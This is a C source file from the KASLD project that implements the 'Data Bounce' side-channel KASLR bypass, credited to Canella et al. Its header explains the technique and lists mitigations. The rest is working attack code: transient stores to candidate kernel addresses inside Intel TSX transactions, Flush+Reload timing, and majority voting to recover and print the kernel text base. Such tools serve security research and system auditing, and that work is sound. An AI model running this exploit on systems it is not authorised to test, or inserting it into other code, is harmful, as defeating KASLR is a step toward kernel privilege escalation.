// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Data Bounce side-channel KASLR bypass.
//
// Exploits store-to-load forwarding within an Intel TSX transaction.
// A transient store of 'X' to a kernel address is followed by a load
// from the same address. If the kernel page is mapped, the store buffer
// forwards the written value back to the load, which then indexes into a
// Flush+Reload probe array at offset 'X' * 4096 — producing a cache hit
// on that specific line. If the page is unmapped, the transaction aborts
// before the store buffer entry is created and no forwarding occurs.
//
// Unlike EchoLoad (which relies on Meltdown zero-return behavior), Data
// Bounce relies on store-to-load forwarding within TSX, which is a
// separate microarchitectural path. Data Bounce is generally reliable but
// occasionally returns no result (~5-15% of runs) due to TLB cold state.
//
// TSX (RTM) is required — the transient store must occur inside an
// xbegin/xabort window. Signal handler and speculation modes cannot
// suppress the fault early enough for the store to reach the store
// buffer, so those modes are not applicable for this technique.
//
// With KPTI enabled, the lowest detected address is typically
// __entry_text_start; with KPTI disabled, it is _stext.
//
// Technique by Claudio Canella, Michael Schwarz, Martin Haubenwallner,
// Martin Schwarzl, and Daniel Gruss:
// "KASLR: Break It, Fix It, Repeat" (Asia CCS 2020)
//
// Leak primitive:
//   Data leaked:      kernel text virtual base address
//   Kernel subsystem: arch/x86 — TSX store-to-load forwarding side-channel
//   Data structure:   kernel text mapping (store buffer forwarding)
//   Address type:     virtual (kernel text)
//   Method:           timing (Flush+Reload on probe array)
//   Status:           unfixed on TSX-capable hardware
//   Access check:     N/A (hardware side-channel — no kernel gate)
//   Source:           N/A (hardware side-channel)
//
// Mitigations:
//   TSX disabled (tsx=off boot param, microcode update, or
//   CONFIG_X86_INTEL_TSX_MODE_OFF) prevents the attack entirely.
//   Non-Intel CPUs lack TSX and are immune. KPTI does not mitigate.
//
// References:
// https://cc0x1f.net/publications/kaslr.pdf
// https://github.com/cc0x1f/store-to-leak-forwarding-there-and-back-again
// https://i.blackhat.com/asia-20/Friday/asia-20-Canella-Store-To-Leak-Forwarding-There-And-Back-Again-wp.pdf
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include "include/sidechannel.h"
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

/* =========================================================================
 * Configuration
 * =========================================================================
 */

/* Number of back-to-back probes per candidate address. If any single
 * probe produces a cache hit, the address is considered mapped. */
#define DATABOUNCE_REPS 10

/* Total number of independent sweeps. The most frequently returned
 * non-zero address wins if it appears in at least DATABOUNCE_SWEEPS/4
 * sweeps (a low bar since false positives are essentially zero).
 * Each sweep exits early on the first hit (<3 ms on typical hardware),
 * so 101 sweeps costs ~300 ms — negligible against the 30 s timeout. */
#define DATABOUNCE_SWEEPS 101

/* Scan window: uses kasld.h defines (KERNEL_BASE_MIN, KERNEL_BASE_MAX). */
#define SCAN_STEP (KERNEL_ALIGN)
#define SCAN_SLOTS                                                             \
  ((unsigned long)(KERNEL_BASE_MAX - KERNEL_BASE_MIN) / SCAN_STEP)

/* The sentinel value written transiently to the kernel address. The
 * Flush+Reload oracle checks probe['X' * 4096]. */
#define BOUNCE_CHAR 'X'

KASLD_EXPLAIN(
    "Data Bounce exploits Intel TSX (Transactional Synchronization "
    "Extensions) store-to-load forwarding: inside a TSX transaction, a "
    "store to a kernel address followed by a load from the same address "
    "forwards the stored value without faulting, but only for mapped "
    "pages. By scanning KASLR candidate addresses with Flush+Reload "
    "as the oracle, mapped kernel text pages are identified. Mitigated "
    "by disabling TSX (tsx=off, microcode update, or "
    "CONFIG_X86_INTEL_TSX_MODE_OFF).");

KASLD_META("method:timing\n"
           "addr:virtual\n"
           "hardware:TSX required (mitigated by tsx=off)\n");

/* =========================================================================
 * TSX xabort
 * =========================================================================
 */

static inline __attribute__((always_inline)) void xabort_wrapper(void) {
  __asm__ volatile(".byte 0xc6,0xf8,0x00" ::: "memory");
}

/* =========================================================================
 * Data Bounce single sweep
 * =========================================================================
 *
 * Scans [KERNEL_BASE_MIN, KERNEL_BASE_MAX) and returns the lowest
 * confirmed mapped address, or 0 if nothing was found.
 *
 * Tests each candidate address independently with DATABOUNCE_REPS
 * back-to-back probes, returning on the first cache hit. This avoids
 * cross-address cache pollution from interleaved scanning.
 */
static unsigned long databounce_sweep(void) {
  /* Pre-flush all 256 probe lines before the scan, matching the
   * reference implementation. */
  for (int i = 0; i < 256; i++)
    flush(probe + i * 4096);

  volatile char *buffer = (volatile char *)KERNEL_BASE_MIN;

  for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
    /* A syscall immediately before each slot's probes brings __entry_text_start
     * (or _stext without KPTI) into the TLB. KVM TLB shootdowns can evict
     * it between slots; a TSX store to a TLB-cold address causes a TLB miss
     * that aborts the transaction before the store buffer entry is created,
     * so no forwarding occurs and the whole slot fails. TSX aborts do not
     * refill the TLB, making all DATABOUNCE_REPS fail in lockstep. */
    syscall(SYS_getuid);
    for (int rep = 0; rep < DATABOUNCE_REPS; rep++) {
      if (xbegin_wrapper() == ~0u) {
        maccess(0);
        *buffer = BOUNCE_CHAR;
        __asm__ volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
                         "nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop");
        maccess(probe + *(volatile char *)buffer * 4096);
        xend_wrapper();
      }

      if (flush_reload(probe + BOUNCE_CHAR * 4096))
        return KERNEL_BASE_MIN + slot * SCAN_STEP;
    }

    buffer += SCAN_STEP;
  }

  return 0;
}

/* =========================================================================
 * main
 * =========================================================================
 */
int main(void) {
  if (!is_intel_cpu()) {
    fprintf(stderr,
            "[-] databounce: not an Intel CPU; attack not applicable\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  if (!has_rtm()) {
    fprintf(stderr, "[-] databounce: TSX/RTM not available; "
                    "required for store-to-load forwarding\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  fprintf(stderr, "[.] databounce: using TSX abort mode\n");

  memset(probe, 1, sizeof(probe));

  cache_miss_threshold = detect_flush_reload_threshold();
  fprintf(stderr, "[.] databounce: cache miss threshold: %zu cycles\n",
          cache_miss_threshold);

  /* Pin to a single core to reduce noise */
  pin_cpu(1);

  /* Run multiple sweeps and take the address that appears most often.
   * An intermittent signal may cause individual sweeps to miss, so
   * majority-vote is more robust than strict unanimity. */
  unsigned long results[DATABOUNCE_SWEEPS];
  for (int s = 0; s < DATABOUNCE_SWEEPS; s++)
    results[s] = databounce_sweep();

  unsigned long addr = 0;
  int best_count = 0;
  for (int i = 0; i < DATABOUNCE_SWEEPS; i++) {
    if (!results[i])
      continue;
    int count = 0;
    for (int j = 0; j < DATABOUNCE_SWEEPS; j++) {
      if (results[j] == results[i])
        count++;
    }
    if (count > best_count) {
      best_count = count;
      addr = results[i];
    }
  }

  if (!addr || best_count < DATABOUNCE_SWEEPS / 4) {
    fprintf(stderr, "[-] databounce: no kernel mapping detected "
                    "(CPU may not be vulnerable)\n");
    return 0;
  }

  /* Same trampoline-vs-stext distinction as echoload: KPTI changes
   * which symbol the prefetch primitive actually finds. */
  bool pti = detect_kpti();
  const char *symbol = pti ? "__entry_text_start" : "_stext";

  fprintf(stderr, "[+] databounce: %s = 0x%016lx\n", symbol, addr);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               KASLD_REGION_KERNEL_TEXT, symbol);

  return 0;
}
